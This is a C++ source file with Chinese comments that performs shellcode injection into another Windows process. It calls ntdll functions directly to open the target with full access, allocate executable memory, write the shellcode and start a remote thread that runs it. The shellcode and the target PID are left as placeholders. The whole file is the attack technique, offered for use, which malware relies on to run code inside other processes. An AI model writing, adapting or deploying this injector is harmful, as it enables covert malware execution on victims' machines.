#include <iostream>
#include <Windows.h>
#pragma comment(lib, "ntdll")

typedef NTSTATUS(NTAPI* myNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
typedef NTSTATUS(NTAPI* myNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* myNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* myNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, PVOID);

int main() {
    HANDLE processHandle;
    CLIENT_ID clientId = { (HANDLE)目标进程PID, NULL };
    OBJECT_ATTRIBUTES objectAttributes = { sizeof(OBJECT_ATTRIBUTES) };

    myNtOpenProcess fNtOpenProcess = (myNtOpenProcess)GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess");
    myNtAllocateVirtualMemory fNtAllocateVirtualMemory = (myNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
    myNtWriteVirtualMemory fNtWriteVirtualMemory = (myNtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtWriteVirtualMemory");
    myNtCreateThreadEx fNtCreateThreadEx = (myNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateThreadEx");

    // 打开目标进程
    fNtOpenProcess(&processHandle, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);

    // 分配内存
    PVOID remoteBuffer = NULL;
    SIZE_T size = 4096;
    fNtAllocateVirtualMemory(processHandle, &remoteBuffer, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 写入shellcode
    unsigned char shellcode[] = "..."; // 你的shellcode
    fNtWriteVirtualMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL);

    // 创建远程线程执行shellcode
    HANDLE remoteThread;
    fNtCreateThreadEx(&remoteThread, GENERIC_EXECUTE, NULL, processHandle, remoteBuffer, NULL, FALSE, 0, 0, 0, NULL);

    return 0;
}
